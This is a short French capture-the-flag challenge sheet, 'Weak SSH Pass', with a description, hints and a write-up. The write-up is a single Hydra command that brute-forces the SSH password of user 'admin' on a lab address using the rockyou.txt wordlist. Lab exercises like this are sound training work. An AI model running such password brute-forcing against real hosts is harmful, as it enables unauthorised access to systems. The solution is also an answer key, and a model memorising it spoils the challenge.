# 21 - Weak SSH Pass

## Nom du Challenge
Weak SSH Pass

## Description
Un accès SSH admin d'un relai d'espionnage est protégé par un mot de passe faible. Le service écoute sur le réseau interne.

## Difficulté
Moyen

## Points
150 pts

## Format du Flag
IPNET{mot_de_passe_ou_cle}

## Hints
1. Hydra automatise le brute-force SSH.
2. Utilisateur ciblé: admin.
3. Utilise rockyou.txt comme dictionnaire.

## Solution (Write-up)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.21 -t 4 -f
# Quand le mot de passe est trouvé: IPNET{mot_de_passe_ou_cle}
```
